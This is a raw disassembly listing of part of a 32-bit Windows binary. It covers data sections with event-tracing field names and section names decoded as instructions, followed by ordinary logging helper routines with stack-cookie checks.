  402467:	outs   dx,DWORD PTR ds:[esi]
  402468:	outs   dx,BYTE PTR ds:[esi]
  402469:	je     0x4024d0
  40246b:	js     0x4024e1
  40246d:	dec    ebp
  40246e:	gs jae 0x4024e4
  402471:	popa   
  402472:	add    BYTE PTR gs:[bx+di],al
  402476:	arpl   WORD PTR [ebp+0x72],si
  402479:	jb     0x4024e0
  40247b:	outs   dx,BYTE PTR ds:[esi]
  40247c:	je     0x4024c1
  40247e:	outs   dx,DWORD PTR ds:[esi]
  40247f:	outs   dx,BYTE PTR ds:[esi]
  402480:	je     0x4024e7
  402482:	js     0x4024f8
  402484:	dec    ecx
  402485:	add    BYTE PTR fs:[eax],cl
  402488:	arpl   WORD PTR [ebp+0x72],si
  40248b:	jb     0x4024f2
  40248d:	outs   dx,BYTE PTR ds:[esi]
  40248e:	je     0x4024d3
  402490:	outs   dx,DWORD PTR ds:[esi]
  402491:	outs   dx,BYTE PTR ds:[esi]
  402492:	je     0x4024f9
  402494:	js     0x40250a
  402496:	dec    esi
  402497:	popa   
  402498:	ins    DWORD PTR es:[edi],dx
  402499:	add    BYTE PTR gs:[edx],al
  40249c:	arpl   WORD PTR [ebp+0x72],si
  40249f:	jb     0x402506
  4024a1:	outs   dx,BYTE PTR ds:[esi]
  4024a2:	je     0x4024e7
  4024a4:	outs   dx,DWORD PTR ds:[esi]
  4024a5:	outs   dx,BYTE PTR ds:[esi]
  4024a6:	je     0x40250d
  4024a8:	js     0x40251e
  4024aa:	dec    ebp
  4024ab:	gs jae 0x402521
  4024ae:	popa   
  4024af:	add    BYTE PTR gs:[bx+di],al
  4024b3:	add    ecx,DWORD PTR [ebx]
  4024b5:	add    eax,0x0
  4024ba:	add    BYTE PTR [eax],al
  4024bc:	add    BYTE PTR [eax],al
  4024be:	add    BYTE PTR [edx],bl
  4024c0:	add    DWORD PTR [eax],eax
  4024c2:	inc    esi
  4024c3:	popa   
  4024c4:	ins    BYTE PTR es:[edi],dx
  4024c5:	ins    BYTE PTR es:[edi],dx
  4024c6:	bound  esp,QWORD PTR [ecx+0x63]
  4024c9:	imul   eax,DWORD PTR [ebp+0x72],0x72
  4024cd:	outs   dx,DWORD PTR ds:[esi]
  4024ce:	jb     0x4024d0
  4024d0:	ja     0x40253b
  4024d2:	ins    BYTE PTR es:[edi],dx
  4024d3:	push   edx
  4024d4:	gs jae 0x40254c
  4024d7:	ins    BYTE PTR es:[edi],dx
  4024d8:	je     0x4024da
  4024da:	cwde   
  4024db:	adc    DWORD PTR [eax+0x72],ebp
  4024de:	gs jae 0x402556
  4024e1:	ins    BYTE PTR es:[edi],dx
  4024e2:	je     0x4024e4
  4024e4:	or     BYTE PTR [esi+0x69],ah
  4024e7:	ins    BYTE PTR es:[edi],dx
  4024e8:	gs dec esi
  4024ea:	popa   
  4024eb:	ins    DWORD PTR es:[edi],dx
  4024ec:	add    BYTE PTR gs:[edx],al
  4024ef:	ins    BYTE PTR es:[edi],dx
  4024f0:	imul   ebp,DWORD PTR [esi+0x65],0x626d754e
  4024f7:	gs jb  0x4024fa
  4024fa:	or     BYTE PTR [ebp+0x6f],ch
  4024fd:	fs jne 0x40256c
  402500:	add    BYTE PTR gs:[edx],al
  402503:	popaw  
  402505:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x70795465
  40250d:	add    BYTE PTR gs:[eax],cl
  402510:	ins    DWORD PTR es:[edi],dx
  402511:	gs jae 0x402587
  402514:	popa   
  402515:	add    BYTE PTR gs:[bx+di],al
  402519:	je     0x402583
  40251b:	jb     0x402582
  40251d:	popa   
  40251e:	fs dec ecx
  402520:	add    BYTE PTR fs:[eax],cl
  402523:	arpl   WORD PTR [ecx+0x6c],sp
  402526:	ins    BYTE PTR es:[edi],dx
  402527:	inc    ebx
  402528:	outs   dx,DWORD PTR ds:[esi]
  402529:	outs   dx,BYTE PTR ds:[esi]
  40252a:	je     0x402591
  40252c:	js     0x4025a2
  40252e:	add    BYTE PTR [edx],al
  402530:	outs   dx,DWORD PTR ds:[esi]
  402531:	jb     0x40259c
  402533:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  40253b:	inc    ebx
  40253c:	outs   dx,DWORD PTR ds:[esi]
  40253d:	outs   dx,BYTE PTR ds:[esi]
  40253e:	je     0x4025a5
  402540:	js     0x4025b6
  402542:	dec    ecx
  402543:	add    BYTE PTR fs:[eax],cl
  402546:	outs   dx,DWORD PTR ds:[esi]
  402547:	jb     0x4025b2
  402549:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  402551:	inc    ebx
  402552:	outs   dx,DWORD PTR ds:[esi]
  402553:	outs   dx,BYTE PTR ds:[esi]
  402554:	je     0x4025bb
  402556:	js     0x4025cc
  402558:	dec    esi
  402559:	popa   
  40255a:	ins    DWORD PTR es:[edi],dx
  40255b:	add    BYTE PTR gs:[edx],al
  40255e:	outs   dx,DWORD PTR ds:[esi]
  40255f:	jb     0x4025ca
  402561:	imul   ebp,DWORD PTR [bp+0x61],0x676e6974
  402569:	inc    ebx
  40256a:	outs   dx,DWORD PTR ds:[esi]
  40256b:	outs   dx,BYTE PTR ds:[esi]
  40256c:	je     0x4025d3
  40256e:	js     0x4025e4
  402570:	dec    ebp
  402571:	gs jae 0x4025e7
  402574:	popa   
  402575:	add    BYTE PTR gs:[bx+di],al
  402579:	arpl   WORD PTR [ebp+0x72],si
  40257c:	jb     0x4025e3
  40257e:	outs   dx,BYTE PTR ds:[esi]
  40257f:	je     0x4025c4
  402581:	outs   dx,DWORD PTR ds:[esi]
  402582:	outs   dx,BYTE PTR ds:[esi]
  402583:	je     0x4025ea
  402585:	js     0x4025fb
  402587:	dec    ecx
  402588:	add    BYTE PTR fs:[eax],cl
  40258b:	arpl   WORD PTR [ebp+0x72],si
  40258e:	jb     0x4025f5
  402590:	outs   dx,BYTE PTR ds:[esi]
  402591:	je     0x4025d6
  402593:	outs   dx,DWORD PTR ds:[esi]
  402594:	outs   dx,BYTE PTR ds:[esi]
  402595:	je     0x4025fc
  402597:	js     0x40260d
  402599:	dec    esi
  40259a:	popa   
  40259b:	ins    DWORD PTR es:[edi],dx
  40259c:	add    BYTE PTR gs:[edx],al
  40259f:	arpl   WORD PTR [ebp+0x72],si
  4025a2:	jb     0x402609
  4025a4:	outs   dx,BYTE PTR ds:[esi]
  4025a5:	je     0x4025ea
  4025a7:	outs   dx,DWORD PTR ds:[esi]
  4025a8:	outs   dx,BYTE PTR ds:[esi]
  4025a9:	je     0x402610
  4025ab:	js     0x402621
  4025ad:	dec    ebp
  4025ae:	gs jae 0x402624
  4025b1:	popa   
  4025b2:	add    BYTE PTR gs:[bx+di],al
  4025b6:	popaw  
  4025b8:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x644965
  4025c0:	or     BYTE PTR [esi+0x61],ah
  4025c3:	imul   ebp,DWORD PTR [ebp+esi*2+0x72],0x756f4365
  4025cb:	outs   dx,BYTE PTR ds:[esi]
  4025cc:	je     0x4025ce
  4025ce:	or     BYTE PTR [esi+0x75],ah
  4025d1:	outs   dx,BYTE PTR ds:[esi]
  4025d2:	arpl   WORD PTR [ecx+ebp*2+0x6f],si
  4025d6:	outs   dx,BYTE PTR ds:[esi]
  4025d7:	add    BYTE PTR [edx],al
  4025d9:	add    ecx,DWORD PTR [ebx]
  4025db:	add    eax,0x0
  4025e0:	add    BYTE PTR [eax],al
  4025e2:	inc    eax
  4025e3:	add    BYTE PTR [eax],al
  4025e5:	cmp    BYTE PTR [eax],al
  4025e7:	add    BYTE PTR [ebp+0x65],cl
  4025ea:	outs   dx,BYTE PTR ds:[esi]
  4025eb:	jne    0x402640
  4025ed:	gs ins BYTE PTR es:[edi],dx
  4025ef:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  4025f4:	add    BYTE PTR [ebp+0x6e],ah
  4025f7:	je     0x40266b
  4025f9:	jns    0x40264b
  4025fb:	outs   dx,DWORD PTR ds:[esi]
  4025fc:	imul   ebp,DWORD PTR [esi+0x74],0x656d0200
  402603:	outs   dx,BYTE PTR ds:[esi]
  402604:	jne    0x402649
  402606:	outs   dx,DWORD PTR ds:[esi]
  402607:	ins    DWORD PTR es:[edi],dx
  402608:	ins    DWORD PTR es:[edi],dx
  402609:	popa   
  40260a:	outs   dx,BYTE PTR ds:[esi]
  40260b:	add    BYTE PTR fs:[edx],al
  40260e:	ins    DWORD PTR es:[edi],dx
  40260f:	outs   dx,BYTE PTR gs:[esi]
  402611:	jne    0x402656
  402613:	outs   dx,DWORD PTR ds:[esi]
  402614:	ins    DWORD PTR es:[edi],dx
  402615:	ins    DWORD PTR es:[edi],dx
  402616:	popa   
  402617:	outs   dx,BYTE PTR ds:[esi]
  402618:	fs dec ecx
  40261a:	add    BYTE PTR fs:[eax],cl
  40261d:	add    al,0xf
  40261f:	jmp    0x5a94:0xbe9f47a8
  402626:	adc    eax,0x19ed5d86
  40262b:	aad    0x7c
  40262d:	cmp    eax,0x694d0045
  402632:	arpl   WORD PTR [edx+0x6f],si
  402635:	jae    0x4026a6
  402637:	data16 je 0x402668
  40263a:	push   edi
  40263b:	imul   ebp,DWORD PTR [esi+0x64],0x2e73776f
  402642:	inc    esp
  402643:	gs jae 0x4026b1
  402646:	je     0x4026b7
  402648:	jo     0x402678
  40264a:	push   esp
  40264b:	gs js  0x4026c2
  40264e:	dec    ecx
  40264f:	outs   dx,BYTE PTR ds:[esi]
  402650:	jo     0x4026c7
  402652:	je     0x402682
  402654:	dec    edx
  402655:	popa   
  402656:	jo     0x4026b9
  402658:	outs   dx,BYTE PTR ds:[esi]
  402659:	gs jae 0x4026c1
  40265c:	dec    ecx
  40265d:	ins    DWORD PTR es:[edi],dx
  40265e:	add    BYTE PTR gs:[ebx],dl
  402661:	add    BYTE PTR [ecx],al
  402663:	sbb    dh,BYTE PTR [ebx+0x50]
  402666:	dec    edi
  402667:	iret   
  402668:	mov    DWORD PTR [edx-0x231f4cb9],eax
  40266e:	call   0xbab62b3c
  402673:	add    DWORD PTR [edx+0x53],edx
  402676:	inc    esp
  402677:	push   ebx
  402678:	retf   0x7dc
  40267b:	xlat   BYTE PTR ds:[ebx]
  40267c:	add    dh,0x17
  40267f:	dec    edx
  402680:	mov    ds:0x434adf7f,eax
  402685:	push   edx
  402686:	popf   
  402687:	outs   dx,BYTE PTR ds:[esi]
  402688:	add    DWORD PTR [eax],eax
  40268a:	add    BYTE PTR [eax],al
  40268c:	imul   ebp,DWORD PTR [ebp+0x6a],0x78657570
  402693:	cs jo  0x4026fa
  402696:	bound  eax,QWORD PTR [eax]
	...
  4026ac:	inc    edi
  4026ad:	inc    ebx
  4026ae:	push   esp
  4026af:	dec    esp
  4026b0:	add    BYTE PTR [eax],dl
  4026b2:	add    BYTE PTR [eax],al
  4026b4:	add    al,0x0
  4026b6:	add    BYTE PTR [eax],al
  4026b8:	cs inc ebx
  4026ba:	push   edx
  4026bb:	push   esp
  4026bc:	and    al,0x58
  4026be:	inc    ebx
  4026bf:	inc    ecx
  4026c0:	add    BYTE PTR [eax],al
  4026c2:	add    BYTE PTR [eax],al
  4026c4:	add    al,0x10
  4026c6:	add    BYTE PTR [eax],al
  4026c8:	add    al,0x0
  4026ca:	add    BYTE PTR [eax],al
  4026cc:	cs inc ebx
  4026ce:	push   edx
  4026cf:	push   esp
  4026d0:	and    al,0x58
  4026d2:	inc    ebx
  4026d3:	inc    ecx
  4026d4:	inc    ecx
  4026d5:	add    BYTE PTR [eax],al
  4026d7:	add    BYTE PTR [eax],cl
  4026d9:	adc    BYTE PTR [eax],al
  4026db:	add    BYTE PTR [eax+eax*1],bl
  4026de:	add    BYTE PTR [eax],al
  4026e0:	cs inc ebx
  4026e2:	push   edx
  4026e3:	push   esp
  4026e4:	and    al,0x58
  4026e6:	inc    ebx
  4026e7:	push   ebp
  4026e8:	add    BYTE PTR [eax],al
  4026ea:	add    BYTE PTR [eax],al
  4026ec:	and    al,0x10
  4026ee:	add    BYTE PTR [eax],al
  4026f0:	add    al,0x0
  4026f2:	add    BYTE PTR [eax],al
  4026f4:	cs inc ebx
  4026f6:	push   edx
  4026f7:	push   esp
  4026f8:	and    al,0x58
  4026fa:	inc    ebx
  4026fb:	pop    edx
  4026fc:	add    BYTE PTR [eax],al
  4026fe:	add    BYTE PTR [eax],al
  402700:	sub    BYTE PTR [eax],dl
  402702:	add    BYTE PTR [eax],al
  402704:	add    al,0x0
  402706:	add    BYTE PTR [eax],al
  402708:	cs inc ebx
  40270a:	push   edx
  40270b:	push   esp
  40270c:	and    al,0x58
  40270e:	dec    ecx
  40270f:	inc    ecx
  402710:	add    BYTE PTR [eax],al
  402712:	add    BYTE PTR [eax],al
  402714:	sub    al,0x10
  402716:	add    BYTE PTR [eax],al
  402718:	add    al,0x0
  40271a:	add    BYTE PTR [eax],al
  40271c:	cs inc ebx
  40271e:	push   edx
  40271f:	push   esp
  402720:	and    al,0x58
  402722:	dec    ecx
  402723:	inc    ecx
  402724:	inc    ecx
  402725:	add    BYTE PTR [eax],al
  402727:	add    BYTE PTR [eax],dh
  402729:	adc    BYTE PTR [eax],al
  40272b:	add    BYTE PTR [eax+eax*1],al
  40272e:	add    BYTE PTR [eax],al
  402730:	cs inc ebx
  402732:	push   edx
  402733:	push   esp
  402734:	and    al,0x58
  402736:	dec    ecx
  402737:	pop    ecx
  402738:	add    BYTE PTR [eax],al
  40273a:	add    BYTE PTR [eax],al
  40273c:	xor    al,0x10
  40273e:	add    BYTE PTR [eax],al
  402740:	add    al,0x0
  402742:	add    BYTE PTR [eax],al
  402744:	cs inc ebx
  402746:	push   edx
  402747:	push   esp
  402748:	and    al,0x58
  40274a:	dec    ecx
  40274b:	pop    edx
  40274c:	add    BYTE PTR [eax],al
  40274e:	add    BYTE PTR [eax],al
  402750:	cmp    BYTE PTR [eax],dl
  402752:	add    BYTE PTR [eax],al
  402754:	loopne 0x402756
  402756:	add    BYTE PTR [eax],al
  402758:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  402760:	add    BYTE PTR [eax],al
  402762:	add    BYTE PTR [eax],al
  402764:	and    BYTE PTR [ecx],dl
  402766:	add    BYTE PTR [eax],al
  402768:	mov    al,ds:0x2e000011
  40276d:	jb     0x4027d3
  40276f:	popa   
  402770:	je     0x4027d3
  402772:	add    BYTE PTR [eax],al
  402774:	shl    BYTE PTR [edx],0x0
  402777:	add    al,dl
  402779:	add    BYTE PTR [eax],al
  40277b:	add    BYTE PTR [esi],ch
  40277d:	jb     0x4027e3
  40277f:	popa   
  402780:	je     0x4027e3
  402782:	and    al,0x72
  402784:	add    BYTE PTR [eax],al
  402786:	add    BYTE PTR [eax],al
  402788:	nop
  402789:	and    eax,DWORD PTR [eax]
  40278b:	add    BYTE PTR [eax],dl
  40278d:	add    BYTE PTR [eax],al
  40278f:	add    BYTE PTR [esi],ch
  402791:	jb     0x4027f7
  402793:	popa   
  402794:	je     0x4027f7
  402796:	and    al,0x73
  402798:	js     0x4027fe
  40279a:	popa   
  40279b:	je     0x4027fe
  40279d:	add    BYTE PTR [eax],al
  40279f:	add    BYTE PTR [eax+0x10000023],ah
  4027a5:	add    BYTE PTR [eax],al
  4027a7:	add    BYTE PTR [esi],ch
  4027a9:	jb     0x40280f
  4027ab:	popa   
  4027ac:	je     0x40280f
  4027ae:	and    al,0x7a
  4027b0:	inc    ebp
  4027b1:	push   esp
  4027b2:	push   edi
  4027b3:	xor    BYTE PTR [eax],al
  4027b5:	add    BYTE PTR [eax],al
  4027b7:	add    BYTE PTR [eax+0x6d000023],dh
  4027bd:	add    al,BYTE PTR [eax]
  4027bf:	add    BYTE PTR [esi],ch
  4027c1:	jb     0x402827
  4027c3:	popa   
  4027c4:	je     0x402827
  4027c6:	and    al,0x7a
  4027c8:	inc    ebp
  4027c9:	push   esp
  4027ca:	push   edi
  4027cb:	xor    DWORD PTR [eax],eax
  4027cd:	add    BYTE PTR [eax],al
  4027cf:	add    BYTE PTR ds:0x56000026,bl
  4027d5:	add    BYTE PTR [eax],al
  4027d7:	add    BYTE PTR [esi],ch
  4027d9:	jb     0x40283f
  4027db:	popa   
  4027dc:	je     0x40283f
  4027de:	and    al,0x7a
  4027e0:	inc    ebp
  4027e1:	push   esp
  4027e2:	push   edi
  4027e3:	xor    al,BYTE PTR [eax]
  4027e5:	add    BYTE PTR [eax],al
  4027e7:	add    BYTE PTR [ebx+0x26],dh
  4027ea:	add    BYTE PTR [eax],al
  4027ec:	add    DWORD PTR [eax],eax
  4027ee:	add    BYTE PTR [eax],al
  4027f0:	cs jb  0x402857
  4027f3:	popa   
  4027f4:	je     0x402857
  4027f6:	and    al,0x7a
  4027f8:	inc    ebp
  4027f9:	push   esp
  4027fa:	push   edi
  4027fb:	cmp    DWORD PTR [eax],eax
  4027fd:	add    BYTE PTR [eax],al
  4027ff:	add    BYTE PTR [esi+eiz*1+0x0],dh
  402803:	add    al,ah
  402805:	add    al,BYTE PTR [eax]
  402807:	add    BYTE PTR [esi],ch
  402809:	jb     0x40286f
  40280b:	popa   
  40280c:	je     0x40286f
  40280e:	and    al,0x7a
  402810:	jp     0x40288c
  402812:	bound  esp,QWORD PTR fs:[edi+0x0]
  402816:	add    BYTE PTR [eax],al
  402818:	push   esp
  402819:	sub    DWORD PTR [eax],eax
  40281b:	add    bh,bl
  40281d:	add    DWORD PTR [eax],eax
  40281f:	add    BYTE PTR [esi],ch
  402821:	je     0x402888
  402823:	js     0x402899
  402825:	add    BYTE PTR [eax],al
  402827:	add    BYTE PTR [ebx],dh
  402829:	sub    eax,DWORD PTR [eax]
  40282b:	add    cl,bh
  40282d:	add    BYTE PTR [eax],al
  40282f:	add    BYTE PTR [esi],ch
  402831:	je     0x402898
  402833:	js     0x4028a9
  402835:	and    al,0x64
  402837:	imul   eax,DWORD PTR [eax],0x30000000
  40283d:	sub    al,0x0
  40283f:	add    BYTE PTR [eax],al
  402841:	sub    al,BYTE PTR [eax]
  402843:	add    BYTE PTR [esi],ch
  402845:	je     0x4028ac
  402847:	js     0x4028bd
  402849:	and    al,0x6d
  40284b:	outs   dx,BYTE PTR ds:[esi]
  40284c:	add    BYTE PTR [eax],al
  40284e:	add    BYTE PTR [eax],al
  402850:	xor    BYTE PTR [esi+0x0],dl
  402853:	add    BYTE PTR [edx+0x2e000000],al
  402859:	je     0x4028c0
  40285b:	js     0x4028d1
  40285d:	and    al,0x78
  40285f:	add    BYTE PTR [edx+0x9000056],dh
  402865:	add    DWORD PTR [eax],eax
  402867:	add    BYTE PTR [esi],ch
  402869:	je     0x4028d0
  40286b:	js     0x4028e1
  40286d:	and    al,0x79
  40286f:	add    BYTE PTR fs:[eax],al
  402872:	add    BYTE PTR [eax],al
  402874:	rcl    BYTE PTR [edi+0x0],0x0
  402878:	pop    eax
  402879:	add    al,BYTE PTR [eax]
  40287b:	add    BYTE PTR [esi],ch
  40287d:	js     0x4028e3
  40287f:	popa   
  402880:	je     0x4028e3
  402882:	and    al,0x78
  402884:	add    BYTE PTR [eax],al
  402886:	add    BYTE PTR [eax],al
  402888:	add    BYTE PTR [eax+0x0],ah
  40288b:	add    BYTE PTR [eax+0x0],dl
  40288e:	add    BYTE PTR [eax],al
  402890:	cs fs popa 
  402893:	je     0x4028f6
  402895:	add    BYTE PTR [eax],al
  402897:	add    BYTE PTR [eax+0x60],dl
  40289a:	add    BYTE PTR [eax],al
  40289c:	pop    ss
  40289d:	add    DWORD PTR [eax],eax
  40289f:	add    BYTE PTR [esi],ch
  4028a1:	fs popa 
  4028a3:	je     0x402906
  4028a5:	and    al,0x72
  4028a7:	add    BYTE PTR [eax+0x61],ch
  4028aa:	add    BYTE PTR [eax],al
  4028ac:	dec    esp
  4028ad:	push   es
  4028ae:	add    BYTE PTR [eax],al
  4028b0:	bound  esi,QWORD PTR cs:[ebx+0x73]
  4028b4:	add    BYTE PTR [eax],al
  4028b6:	add    BYTE PTR [eax],al
  4028b8:	add    BYTE PTR [eax+0x0],dh
  4028bb:	add    BYTE PTR [ecx+eax*1+0x0],bh
  4028bf:	add    BYTE PTR [esi],ch
  4028c1:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x352461
  4028c9:	add    BYTE PTR [eax],al
  4028cb:	add    BYTE PTR [ecx+esi*2+0x0],bh
  4028cf:	add    BYTE PTR [eax+eax*1],al
  4028d2:	add    BYTE PTR [eax],al
  4028d4:	xor    BYTE PTR cs:[eax],dh
  4028d7:	arpl   WORD PTR [esi+0x67],sp
  4028da:	add    BYTE PTR [eax],al
  4028dc:	xor    BYTE PTR [ecx+0x0],0x0
  4028e0:	mov    WORD PTR [eax],es
  4028e2:	add    BYTE PTR [eax],al
  4028e4:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x322461
  4028ed:	add    BYTE PTR [eax],al
  4028ef:	add    BYTE PTR [edx+esi*2],cl
  4028f2:	add    BYTE PTR [eax],al
  4028f4:	adc    al,0x0
  4028f6:	add    BYTE PTR [eax],al
  4028f8:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  402901:	add    BYTE PTR [eax],al
  402903:	add    BYTE PTR [eax],ah
  402905:	jb     0x402907
  402907:	add    BYTE PTR [ecx+eax*1+0x0],bh
  40290b:	add    BYTE PTR [esi],ch
  40290d:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  402915:	add    BYTE PTR [eax],al
  402917:	add    BYTE PTR [ebx+esi*2+0x6680000],bl
  40291e:	add    BYTE PTR [eax],al
  402920:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x362461
  402929:	add    BYTE PTR [eax],al
  40292b:	add    BYTE PTR [eax],al
  40292d:	add    BYTE PTR [eax],0x0
  402930:	add    BYTE PTR [eax+eax*1],al
  402933:	add    BYTE PTR [esi],ch
  402935:	jb     0x4029aa
  402937:	jb     0x40299c
  402939:	and    al,0x30
  40293b:	xor    DWORD PTR [eax],eax
  40293d:	add    BYTE PTR [eax],al
  40293f:	add    BYTE PTR [eax],al
  402941:	test   BYTE PTR [eax],al
  402943:	add    BYTE PTR [eax],al
  402945:	stos   DWORD PTR es:[edi],eax
  402946:	add    BYTE PTR [eax],al
  402948:	cs jb  0x4029be
  40294b:	jb     0x4029b0
  40294d:	and    al,0x30
  40294f:	xor    al,BYTE PTR [eax]
	...
  40295d:	add    BYTE PTR [eax],al
  40295f:	add    BYTE PTR [ebx-0x1374aa01],cl
  402965:	push   ecx
  402966:	mov    eax,ds:0x406004
  40296b:	xor    eax,ebp
  40296d:	mov    DWORD PTR [ebp-0x4],eax
  402970:	mov    eax,DWORD PTR [ebp+0x28]
  402973:	test   eax,eax
  402975:	je     0x4029e2
  402977:	mov    ecx,DWORD PTR [ebp+0xc]
  40297a:	mov    edx,DWORD PTR [ebp+0x10]
  40297d:	push   ebx
  40297e:	mov    ebx,DWORD PTR [ebp+0x1c]
  402981:	push   edi
  402982:	mov    edi,DWORD PTR [ebp+0x20]
  402985:	sub    ecx,0x0
  402988:	je     0x4029b4
  40298a:	sub    ecx,0x1
  40298d:	jne    0x4029b7
  40298f:	test   dl,dl
  402991:	je     0x402999
  402993:	movzx  ecx,dl
  402996:	inc    ecx
  402997:	jmp    0x40299e
  402999:	mov    ecx,0x100
  40299e:	mov    DWORD PTR [eax],ecx
  4029a0:	mov    ecx,DWORD PTR [ebp+0x14]
  4029a3:	mov    DWORD PTR [eax+0x8],ecx
  4029a6:	mov    ecx,DWORD PTR [ebp+0x18]
  4029a9:	mov    DWORD PTR [eax+0xc],ecx
  4029ac:	mov    DWORD PTR [eax+0x10],ebx
  4029af:	mov    DWORD PTR [eax+0x14],edi
  4029b2:	jmp    0x4029ba
  4029b4:	and    DWORD PTR [eax],0x0
  4029b7:	mov    ecx,DWORD PTR [ebp+0x18]
  4029ba:	push   esi
  4029bb:	mov    esi,DWORD PTR [eax+0x20]
  4029be:	test   esi,esi
  4029c0:	je     0x4029df
  4029c2:	push   DWORD PTR [eax+0x24]
  4029c5:	push   DWORD PTR [ebp+0x24]
  4029c8:	push   edi
  4029c9:	push   ebx
  4029ca:	push   ecx
  4029cb:	push   DWORD PTR [ebp+0x14]
  4029ce:	mov    ecx,esi
  4029d0:	push   edx
  4029d1:	push   DWORD PTR [ebp+0xc]
  4029d4:	push   DWORD PTR [ebp+0x8]
  4029d7:	call   DWORD PTR ds:0x40717c
  4029dd:	call   esi
  4029df:	pop    esi
  4029e0:	pop    edi
  4029e1:	pop    ebx
  4029e2:	mov    ecx,DWORD PTR [ebp-0x4]
  4029e5:	xor    ecx,ebp
  4029e7:	call   0x404560
  4029ec:	mov    esp,ebp
  4029ee:	pop    ebp
  4029ef:	ret    0x24
  4029f2:	int3   
  4029f3:	int3   
  4029f4:	int3   
  4029f5:	int3   
  4029f6:	int3   
  4029f7:	mov    edi,edi
  4029f9:	push   ebx
  4029fa:	push   esi
  4029fb:	xor    ebx,ebx
  4029fd:	mov    esi,ebx
  4029ff:	push   edi
  402a00:	mov    edi,0x40208c
  402a05:	test   edx,edx
  402a07:	je     0x402a1f
  402a09:	mov    esi,edx
  402a0b:	mov    edi,edx
  402a0d:	lea    edx,[esi+0x2]
  402a10:	mov    ax,WORD PTR [esi]
  402a13:	add    esi,0x2
  402a16:	cmp    ax,bx
  402a19:	jne    0x402a10
  402a1b:	sub    esi,edx
  402a1d:	sar    esi,1
  402a1f:	mov    DWORD PTR [ecx],edi
  402a21:	lea    eax,[esi*2+0x2]
  402a28:	pop    edi
  402a29:	pop    esi
  402a2a:	mov    DWORD PTR [ecx+0x4],ebx
  402a2d:	mov    DWORD PTR [ecx+0xc],ebx
  402a30:	mov    DWORD PTR [ecx+0x8],eax
  402a33:	pop    ebx
  402a34:	ret    
  402a35:	int3   
  402a36:	int3   
  402a37:	int3   
  402a38:	int3   
  402a39:	int3   
  402a3a:	mov    edi,edi
  402a3c:	push   ebp
  402a3d:	mov    ebp,esp
  402a3f:	mov    edx,DWORD PTR [ecx+0x8]
  402a42:	mov    eax,DWORD PTR [ecx+0xc]
  402a45:	and    edx,DWORD PTR [ebp+0x8]
  402a48:	and    eax,DWORD PTR [ebp+0xc]
  402a4b:	or     edx,eax
  402a4d:	je     0x402a69
  402a4f:	mov    eax,DWORD PTR [ecx+0x10]
  402a52:	mov    edx,DWORD PTR [ecx+0x14]
  402a55:	and    eax,DWORD PTR [ebp+0x8]
  402a58:	and    edx,DWORD PTR [ebp+0xc]
  402a5b:	cmp    eax,DWORD PTR [ecx+0x10]
  402a5e:	jne    0x402a69
  402a60:	cmp    edx,DWORD PTR [ecx+0x14]
  402a63:	jne    0x402a69
  402a65:	mov    al,0x1
  402a67:	jmp    0x402a6b
  402a69:	xor    al,al
  402a6b:	pop    ebp
  402a6c:	ret    0x8
  402a6f:	int3   
  402a70:	int3   
  402a71:	int3   
  402a72:	int3   
  402a73:	int3   
  402a74:	mov    edi,edi
  402a76:	push   esi
  402a77:	xor    esi,esi
  402a79:	push   edi
  402a7a:	mov    edi,0x40208e
  402a7f:	test   edx,edx
  402a81:	je     0x402a93
  402a83:	mov    esi,edx
  402a85:	mov    edi,edx
  402a87:	lea    edx,[esi+0x1]
  402a8a:	mov    al,BYTE PTR [esi]
  402a8c:	inc    esi
  402a8d:	test   al,al
  402a8f:	jne    0x402a8a
  402a91:	sub    esi,edx
  402a93:	and    DWORD PTR [ecx+0x4],0x0
  402a97:	lea    eax,[esi+0x1]
  402a9a:	and    DWORD PTR [ecx+0xc],0x0
  402a9e:	mov    DWORD PTR [ecx],edi
  402aa0:	pop    edi
  402aa1:	mov    DWORD PTR [ecx+0x8],eax
  402aa4:	pop    esi
  402aa5:	ret    
  402aa6:	int3   
  402aa7:	int3   
  402aa8:	int3   
  402aa9:	int3   
  402aaa:	int3   
  402aab:	mov    edi,edi
  402aad:	push   ebp
  402aae:	mov    ebp,esp
  402ab0:	sub    esp,0x10
  402ab3:	mov    al,ds:0x402673
  402ab8:	movzx  eax,BYTE PTR [edx]
  402abb:	push   esi
  402abc:	shl    eax,0x18
  402abf:	mov    esi,edx
  402ac1:	push   edi
  402ac2:	sub    esi,0x4023a0
  402ac8:	mov    edi,ecx
  402aca:	mov    ecx,DWORD PTR [ebp+0x14]
  402acd:	or     eax,esi
  402acf:	mov    DWORD PTR [ebp-0x10],eax
  402ad2:	xor    esi,esi
  402ad4:	movzx  eax,WORD PTR [edx+0x1]
  402ad8:	mov    DWORD PTR [ebp-0xc],eax
  402adb:	mov    eax,DWORD PTR [edx+0x3]
  402ade:	mov    DWORD PTR [ebp-0x8],eax
  402ae1:	mov    eax,DWORD PTR [edx+0x7]
  402ae4:	add    edx,0xb
  402ae7:	mov    DWORD PTR [ebp-0x4],eax
  402aea:	mov    eax,DWORD PTR [edi+0x4]
  402aed:	mov    DWORD PTR [ecx],eax
  402aef:	mov    DWORD PTR [ecx+0x4],esi
  402af2:	mov    eax,DWORD PTR [edi+0x4]
  402af5:	push   ecx
  402af6:	push   DWORD PTR [ebp+0x10]
  402af9:	movzx  eax,WORD PTR [eax]
  402afc:	mov    DWORD PTR [ecx+0x8],eax
  402aff:	mov    DWORD PTR [ecx+0xc],0x2
  402b06:	mov    DWORD PTR [ecx+0x10],edx
  402b09:	mov    DWORD PTR [ecx+0x14],esi
  402b0c:	movzx  eax,WORD PTR [edx]
  402b0f:	push   esi
  402b10:	mov    DWORD PTR [ecx+0x18],eax
  402b13:	lea    eax,[ebp-0x10]
  402b16:	push   esi
  402b17:	push   eax
  402b18:	mov    DWORD PTR [ecx+0x1c],0x1
  402b1f:	push   DWORD PTR [edi+0x1c]
  402b22:	push   DWORD PTR [edi+0x18]
  402b25:	call   DWORD PTR ds:0x407000
  402b2b:	pop    edi
  402b2c:	pop    esi
  402b2d:	mov    esp,ebp
